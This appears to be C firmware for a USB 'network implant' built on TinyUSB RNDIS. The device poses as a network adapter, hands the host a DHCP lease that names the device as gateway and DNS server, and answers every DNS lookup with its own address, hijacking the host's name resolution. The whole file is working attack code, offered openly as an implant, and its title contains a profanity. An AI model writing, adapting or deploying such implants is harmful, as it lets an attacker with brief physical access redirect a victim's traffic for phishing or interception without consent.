/*
 * ThrustFucker — Firmware C : Network Implant
 * Mini-stack RNDIS : ARP + DHCP server + DNS hijacking (no lwIP)
 *
 * Device : 192.168.100.1  MAC 02:F0:46:E0:01:01
 * Client : 192.168.100.2  (assigned via DHCP)
 * DNS / GW : 192.168.100.1 (device)
 *
 * Toutes les requêtes DNS sont redirigées vers l'IP du device (captive portal).
 */

#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include "tusb.h"

/* ── Network parameters ──────────────────────────────────────────────────── */
static const uint8_t DEV_IP[4]    = {192, 168, 100,   1};
static const uint8_t CLI_IP[4]    = {192, 168, 100,   2};
static const uint8_t SUBNET[4]    = {255, 255, 255,   0};
static const uint8_t BCAST_IP[4]  = {255, 255, 255, 255};
static const uint8_t BCAST_MAC[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

/* Locally-administered unicast MAC — exigé par TinyUSB RNDIS */
uint8_t tud_network_mac_address[6] = {0x02, 0xF0, 0x46, 0xE0, 0x01, 0x01};

static uint8_t  cli_mac[6];         /* appris depuis le premier DHCP DISCOVER */
static uint8_t  tx_buf[CFG_TUD_NET_MTU];
static uint16_t tx_len = 0;

/* ── Helpers big-endian ──────────────────────────────────────────────────── */
static void w16(uint8_t *p, uint16_t v) { p[0]=v>>8; p[1]=(uint8_t)v; }
static void w32(uint8_t *p, uint32_t v) { p[0]=v>>24; p[1]=v>>16; p[2]=v>>8; p[3]=(uint8_t)v; }
static uint16_t r16(const uint8_t *p)   { return ((uint16_t)p[0]<<8)|p[1]; }
static uint32_t r32(const uint8_t *p)   { return ((uint32_t)p[0]<<24)|((uint32_t)p[1]<<16)|((uint32_t)p[2]<<8)|p[3]; }

/* ── IP checksum ─────────────────────────────────────────────────────────── */
static uint16_t ip_cksum(const uint8_t *p, uint16_t n) {
    uint32_t s = 0;
    for (; n > 1; n -= 2, p += 2) s += ((uint32_t)p[0]<<8)|p[1];
    if (n) s += (uint32_t)p[0]<<8;
    while (s>>16) s = (s&0xFFFF)+(s>>16);
    return (uint16_t)~s;
}

/* ── Build Ethernet/IPv4/UDP frame in tx_buf ─────────────────────────────── */
#define ETH  14
#define IPH  20
#define UDPH  8

static void tx_udp(const uint8_t *dm, const uint8_t *dip,
                   uint16_t sp, uint16_t dp,
                   const uint8_t *pay, uint16_t plen) {
    uint8_t *p = tx_buf;
    memcpy(p, dm, 6); p+=6;
    memcpy(p, tud_network_mac_address, 6); p+=6;
    w16(p, 0x0800); p+=2;
    uint8_t *ip = p;
    ip[0]=0x45; ip[1]=0;
    w16(ip+2,  (uint16_t)(IPH+UDPH+plen));
    w16(ip+4,  1);
    w16(ip+6,  0x4000);        /* DF */
    ip[8]=64; ip[9]=17;        /* TTL=64, proto=UDP */
    w16(ip+10, 0);
    memcpy(ip+12, DEV_IP, 4);
    memcpy(ip+16, dip, 4);
    w16(ip+10, ip_cksum(ip, IPH));
    p += IPH;
    w16(p,   sp);
    w16(p+2, dp);
    w16(p+4, (uint16_t)(UDPH+plen));
    w16(p+6, 0);               /* UDP checksum optionnel en IPv4 */
    p += UDPH;
    memcpy(p, pay, plen);
    tx_len = ETH + IPH + UDPH + plen;
}

/* ── ARP reply ───────────────────────────────────────────────────────────── */
static void do_arp(const uint8_t *a) {
    /* a = ARP payload (offset 14 from Ethernet frame) */
    if (r16(a+6) != 1)              return; /* pas une requête */
    if (memcmp(a+24, DEV_IP, 4)!=0) return; /* pas pour nous */

    uint8_t *p = tx_buf;
    memcpy(p,  a+8, 6); p+=6;                   /* Ethernet dst = sender MAC */
    memcpy(p,  tud_network_mac_address, 6); p+=6;
    w16(p, 0x0806); p+=2;
    w16(p, 1);   w16(p+2, 0x0800); p+=4;
    *p++=6; *p++=4;
    w16(p, 2); p+=2;                             /* oper=reply */
    memcpy(p,  tud_network_mac_address, 6); p+=6; /* SHA */
    memcpy(p,  DEV_IP, 4); p+=4;                  /* SPA */
    memcpy(p,  a+8,  6);   p+=6;                  /* THA = sender */
    memcpy(p,  a+14, 4);   p+=4;                  /* TPA = sender IP */
    tx_len = ETH + 28;
}

/* ── DHCP server ─────────────────────────────────────────────────────────── */
#define DHCP_DISCOVER  1
#define DHCP_OFFER     2
#define DHCP_REQUEST   3
#define DHCP_ACK       5
#define DHCP_MAGIC     0x63825363UL

static void do_dhcp(const uint8_t *d, uint16_t dlen) {
    if (dlen < 240 || r32(d+236) != DHCP_MAGIC) return;

    uint8_t msg = 0;
    const uint8_t *o = d+240, *end = d+dlen;
    while (o < end && *o != 255) {
        if (*o == 0) { o++; continue; }
        if (o+1 >= end) break;
        uint8_t ol = o[1];
        if (o+2+ol > end) break;
        if (*o == 53 && ol == 1) msg = o[2];
        o += 2+ol;
    }
    if (msg != DHCP_DISCOVER && msg != DHCP_REQUEST) return;

    memcpy(cli_mac, d+28, 6);

    static uint8_t rep[300];
    memset(rep, 0, sizeof(rep));
    rep[0]=2; rep[1]=1; rep[2]=6;   /* BOOTREPLY, Ethernet, hlen=6 */
    memcpy(rep+4,  d+4,  4);        /* xid */
    memcpy(rep+16, CLI_IP, 4);      /* yiaddr */
    memcpy(rep+20, DEV_IP, 4);      /* siaddr */
    memcpy(rep+28, d+28,  6);       /* chaddr */
    w32(rep+236, DHCP_MAGIC);

    uint8_t *op = rep+240;
    *op++=53; *op++=1; *op++=(msg==DHCP_DISCOVER)?DHCP_OFFER:DHCP_ACK;
    *op++=54; *op++=4; memcpy(op,DEV_IP,4);  op+=4;
    *op++=51; *op++=4; w32(op, 86400);        op+=4;
    *op++=1;  *op++=4; memcpy(op,SUBNET,4);  op+=4;
    *op++=3;  *op++=4; memcpy(op,DEV_IP,4);  op+=4;
    *op++=6;  *op++=4; memcpy(op,DEV_IP,4);  op+=4;
    *op++=255;

    uint16_t plen = (uint16_t)(op - rep) + 1;
    bool bcast = (d[10] & 0x80) != 0;
    tx_udp(bcast ? BCAST_MAC : cli_mac,
           bcast ? BCAST_IP  : CLI_IP,
           67, 68, rep, plen);
}

/* ── DNS : répond toutes les requêtes A avec l'IP du device ──────────────── */
static void do_dns(const uint8_t *dns, uint16_t dlen,
                   const uint8_t *smac, const uint8_t *sip, uint16_t sport) {
    if (dlen < 12 || (r16(dns+2) & 0x8000)) return; /* ignorer les réponses */

    static uint8_t rep[512];
    if (dlen > 256) dlen = 256;
    memcpy(rep, dns, dlen);
    rep[2] = (uint8_t)(0x81|(dns[2]&0x01));
    rep[3] = 0x80;                /* QR=1 AA=1 RA=1 */
    w16(rep+6, 1); w16(rep+8, 0); w16(rep+10, 0);

    uint8_t *a = rep + dlen;
    *a++=0xC0; *a++=12;           /* name = ptr vers question */
    w16(a,1); a+=2;               /* type A */
    w16(a,1); a+=2;               /* class IN */
    w32(a,60); a+=4;              /* TTL 60s */
    w16(a,4); a+=2;               /* rdlength=4 */
    memcpy(a, DEV_IP, 4); a+=4;

    tx_udp(smac, sip, 53, sport, rep, (uint16_t)(a-rep));
}

/* ── Dispatcher Ethernet ─────────────────────────────────────────────────── */
static void eth_recv(const uint8_t *f, uint16_t len) {
    if (len < ETH) return;
    uint16_t et = r16(f+12);
    const uint8_t *sm  = f+6;
    const uint8_t *pl  = f+14;
    uint16_t plen = len - ETH;

    if (et == 0x0806) {
        if (plen >= 28) do_arp(pl);
        return;
    }
    if (et != 0x0800 || plen < IPH) return;

    uint8_t  proto = pl[9];
    uint16_t ih    = (uint16_t)((pl[0]&0x0F)<<2);
    if (proto != 17 || plen < (uint16_t)(ih+UDPH)) return;

    const uint8_t *udp  = pl+ih;
    const uint8_t *sip  = pl+12;
    uint16_t sport = r16(udp);
    uint16_t dport = r16(udp+2);
    uint16_t ulen  = r16(udp+4);
    const uint8_t *up   = udp+UDPH;
    uint16_t uplen = (ulen > UDPH) ? (ulen - (uint16_t)UDPH) : 0;

    if (dport == 67 && uplen >= 240) do_dhcp(up, uplen);
    else if (dport == 53 && uplen >= 12) do_dns(up, uplen, sm, sip, sport);
}

/* ── TinyUSB RNDIS callbacks ─────────────────────────────────────────────── */
bool tud_network_recv_cb(const uint8_t *src, uint16_t size) {
    if (!tx_len) eth_recv(src, size);
    tud_network_recv_renew();
    return true;
}

uint16_t tud_network_xmit_cb(uint8_t *dst, void *ref, uint16_t arg) {
    (void)ref; (void)arg;
    uint16_t n = tx_len;
    if (n) { memcpy(dst, tx_buf, n); tx_len = 0; }
    return n;
}

void tud_network_init_cb(void) { tx_len = 0; }

/* Requis par TinyUSB RNDIS — gère les SET_CLASS_COMMAND du host */
void rndis_class_set_handler(uint8_t *data, int size) {
    (void)data; (void)size;
}

/* ── Polling depuis main loop ────────────────────────────────────────────── */
void net_app_poll(void) {
    if (tx_len && tud_network_can_xmit(tx_len))
        tud_network_xmit(NULL, 0);
}
